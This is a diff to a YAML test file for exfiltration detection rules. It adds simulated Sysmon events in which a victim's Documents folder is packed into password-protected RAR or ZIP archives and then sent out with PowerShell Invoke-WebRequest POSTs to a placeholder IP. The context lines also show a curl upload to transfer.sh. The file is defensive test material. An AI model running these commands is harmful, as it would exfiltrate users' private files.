@@ -6,6 +6,25 @@ cases:
       - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Program Files\7-Zip\7z.exe', OriginalFileName: 7z.exe, Description: 7-Zip Console, CommandLine: '7z.exe a -pS3cr3t -mhe=on C:\Users\Public\docs.7z C:\Users\victim\Documents', ParentImage: 'C:\Windows\System32\cmd.exe'}
       - at: 600
         event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\curl.exe', OriginalFileName: curl.exe, CommandLine: 'curl.exe --upload-file C:\Users\Public\docs.7z https://transfer.sh/docs.7z', ParentImage: 'C:\Windows\System32\cmd.exe'}
+  - name: positive_rar_password_then_mega_dns
+    # MEGAcmd резолвит userstorage.mega.co.nz не из браузера - заодно hunting-инцидент файлообменника
+    expect_incidents: [exfil_archive_then_transfer, th_exfil_filesharing_dns]
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Program Files\WinRAR\Rar.exe', OriginalFileName: Rar.exe, CommandLine: '"C:\Program Files\WinRAR\Rar.exe" a -hpS3cr3t -m5 C:\Users\Public\d.rar C:\Users\victim\Documents', ParentImage: 'C:\Windows\System32\cmd.exe'}
+      - at: 400
+        event: {EventID: 22, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Users\victim\AppData\Local\MEGAcmd\MEGAclient.exe', QueryName: gfs270n171.userstorage.mega.co.nz, QueryStatus: "0"}
+  - name: positive_winzip_password_then_powershell_post
+    expect_incidents: [exfil_archive_then_transfer]
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Program Files\WinZip\winzip64.exe', OriginalFileName: WINZIP64.EXE, CommandLine: '"C:\Program Files\WinZip\winzip64.exe" -min -a -s"S3cr3t" C:\Temp\d.zip C:\Users\victim\Documents', ParentImage: 'C:\Windows\System32\cmd.exe'}
+      - at: 300
+        event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', OriginalFileName: PowerShell.EXE, CommandLine: 'powershell -c "Invoke-WebRequest -Uri https://198.51.100.9/u -Method POST -Body (Get-Content .\d.zip -Raw)"', ParentImage: 'C:\Windows\System32\cmd.exe'}
+  - name: negative_rar_without_password
+    expect_incidents: []
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Program Files\WinRAR\Rar.exe', OriginalFileName: Rar.exe, CommandLine: '"C:\Program Files\WinRAR\Rar.exe" a -m5 C:\backup\d.rar C:\Users\victim\Documents', ParentImage: 'C:\Windows\System32\cmd.exe'}
+      - at: 300
+        event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', OriginalFileName: PowerShell.EXE, CommandLine: 'powershell -c "Invoke-WebRequest -Uri https://198.51.100.9/u -Method POST -Body (Get-Content .\d.rar -Raw)"', ParentImage: 'C:\Windows\System32\cmd.exe'}
   - name: negative_transfer_before_archive
     expect_incidents: []
     events:
